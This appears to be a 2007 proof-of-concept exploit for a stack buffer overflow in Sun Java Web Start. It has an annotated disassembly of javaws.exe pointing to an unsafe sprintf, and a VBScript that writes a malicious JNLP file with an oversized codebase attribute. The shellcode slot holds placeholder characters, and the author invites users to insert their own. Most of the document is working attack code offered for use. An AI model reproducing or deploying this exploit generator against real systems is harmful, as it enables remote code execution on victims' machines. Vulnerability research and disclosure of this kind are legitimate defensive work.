Sun Java WebStart JNLP Stack Buffer Overflow Exploit PoC
========================================================



&#039;-----------------------------------------------------------------------------------------------
&#039; Java Web Start Buffer Overflow POC Exploit
&#039;
&#039; FileName: JavaWebStartPOC.VBS
&#039; Contact: ZhenHan.Liu#ph4nt0m.org
&#039; Date: 2007-07-10
&#039; Team: http://www.ph4nt0m.org
&#039; Enviroment: Tested on JRE 1.6, javaws.exe v6.0.10.6
&#039; Reference: http://seclists.org/fulldisclosure/2007/Jul/0155.html
&#039; Usage: I did not put a real alpha shellcode here, you&#039;d replace it with your own.
&#039; 
&#039; Code(javaws.exe):
&#039; .text:00406208 ; *************** S U B R O U T I N E ***************************************
&#039; .text:00406208
&#039; .text:00406208 ; Attributes: bp-based frame
&#039; .text:00406208
&#039; .text:00406208 sub_406208      proc near               ; CODE XREF: sub_405468+4E p
&#039; .text:00406208
&#039; .text:00406208 FileName        = byte ptr -540h
&#039; .text:00406208 FindFileData    = _WIN32_FIND_DATAA ptr -140h
&#039; .text:00406208 arg_0           = dword ptr  8
&#039; .text:00406208 arg_4           = dword ptr  0Ch
&#039; .text:00406208
&#039; .text:00406208                 push    ebp             ; FileName 1k Buffer
&#039; .text:00406209                 mov     ebp, esp
&#039; .text:0040620B                 sub     esp, 540h
&#039; .text:00406211                 push    5Fh
&#039; .text:00406213                 push    2Fh
&#039; .text:00406215                 push    [ebp+arg_0]
&#039; .text:00406218                 call    sub_40544D
&#039; .text:00406218
&#039; .text:0040621D                 push    5Fh
&#039; .text:0040621F                 push    3Ah
&#039; .text:00406221                 push    [ebp+arg_0]
&#039; .text:00406224                 call    sub_40544D
&#039; .text:00406224
&#039; .text:00406229                 add     esp, 18h
&#039; .text:0040622C                 push    2Ah
&#039; .text:0040622E                 push    [ebp+arg_0]     ; codebase buffer
&#039; .text:00406231                 push    5Ch
&#039; .text:00406233                 push    offset s_Si     ; "si"
&#039; .text:00406238                 push    5Ch
&#039; .text:0040623A                 push    offset s_Tmp_0  ; "tmp"
&#039; .text:0040623F                 push    5Ch
&#039; .text:00406241                 call    sub_40615B
&#039; .text:00406241
&#039; .text:00406246                 push    eax
&#039; .text:00406247                 lea     eax, [ebp+FileName]
&#039; .text:0040624D                 push    offset s_SCSCSCSC ; "%s%c%s%c%s%c%s%c"
&#039; .text:00406252                 push    eax             ; char *
&#039; .text:00406253                 call    _sprintf        ; sprintf copy codebase to 1k stack buffer lead to buffer over flow
&#039; .text:00406253
&#039; .text:00406258                 add     esp, 28h
&#039; .text:0040625B                 lea     eax, [ebp+FindFileData]
&#039; .text:00406261                 push    eax             ; lpFindFileData
&#039; .text:00406262                 lea     eax, [ebp+FileName]
&#039; .text:00406268                 push    eax             ; lpFileName
&#039; .text:00406269                 call    ds:FindFirstFileA
&#039; .text:0040626F                 cmp     eax, 0FFFFFFFFh
&#039; .text:00406272                 jnz     short loc_406278
&#039; .text:00406272
&#039; .text:00406274                 xor     eax, eax
&#039; .text:00406276                 leave
&#039; .text:00406277                 retn
&#039; .text:00406277
&#039; .text:00406278 ; ---------------------------------------------------------------------------
&#039; .text:00406278
&#039; .text:00406278 loc_406278:                             ; CODE XREF: sub_406208+6A j
&#039; .text:00406278                 push    esi
&#039; .text:00406279                 mov     esi, [ebp+arg_4]
&#039; .text:0040627C                 lea     ecx, [ebp+FindFileData&#039; .cFileName]
&#039; .text:00406282                 mov     edx, ecx
&#039; .text:00406284                 sub     esi, edx
&#039; .text:00406284
&#039; .text:00406286
&#039; .text:00406286 loc_406286:                             ; CODE XREF: sub_406208+86 j
&#039; .text:00406286                 mov     dl, [ecx]
&#039; .text:00406288                 mov     [esi+ecx], dl
&#039; .text:0040628B                 inc     ecx
&#039; .text:0040628C                 test    dl, dl
&#039; .text:0040628E                 jnz     short loc_406286
&#039; .text:0040628E
&#039; .text:00406290                 push    eax             ; hFindFile
&#039; .text:00406291                 call    ds:FindClose
&#039; .text:00406297                 xor     eax, eax
&#039; .text:00406299                 inc     eax
&#039; .text:0040629A                 pop     esi
&#039; .text:0040629B                 leave
&#039; .text:0040629C                 retn
&#039; .text:0040629C
&#039; .text:0040629C sub_406208      endp
&#039;-----------------------------------------------------------------------------------------------

If WScript.Arguments.Count <> 1 Then
	WScript.Echo WScript.ScriptName & " <FileName>"
	WScript.Quit
End If

sFileName = WScript.Arguments(0)

On Error Resume Next

Set oFSO = WScript.CreateObject("Scripting.FileSystemObject")
Set oFS = oFSO.CreateTextFile(sFileName)

If Err.Number <> 0 Then
	WScript.Echo "Error: Failed Create File."
	WScript.Quit
End If

c = Chr(&H04)
alphaShellcode = "IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII"

oFS.WriteLine "<?xml version=""1.0"" encoding=""utf-8""?>"
oFS.WriteLine "<jnlp spec=""1.0+"" codebase=""http://" & String(12000000, c) & alphaShellcode & String(24, c) & """ href=""test.jnlp"">"
oFS.WriteLine "</jnlp>"

If Err.Number <> 0 Then
	WScript.Echo "Error: Failed Write File."
	Err.Clear
End If

oFS.Close

Set oFS = Nothing
Set oFSO = Nothing

&#039; 


